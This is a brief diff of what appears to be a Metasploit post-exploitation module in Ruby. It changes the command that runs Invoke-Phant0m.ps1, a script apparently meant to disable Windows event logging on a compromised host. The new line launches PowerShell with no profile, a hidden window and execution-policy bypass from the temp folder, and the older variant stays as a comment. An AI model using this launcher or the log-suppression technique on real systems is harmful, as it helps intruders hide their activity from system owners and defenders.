@@ -153,7 +153,8 @@ end
   r=''
   d_path = datastore['UPLOAD_PATH']
   u_path = datastore['REMOTE_PATH']
-  key = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command Invoke-Phant0m.ps1"
+  key = "powershell.exe -nop -wind hidden -ExecutionPolicy Bypass -File \"%temp%\\Invoke-Phant0m.ps1\""
+  # key = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File \"%temp%\\Invoke-Phant0m.ps1\""
   #
   # check for proper config settings enter ..
   # to prevent 'unset all' from deleting default options ..
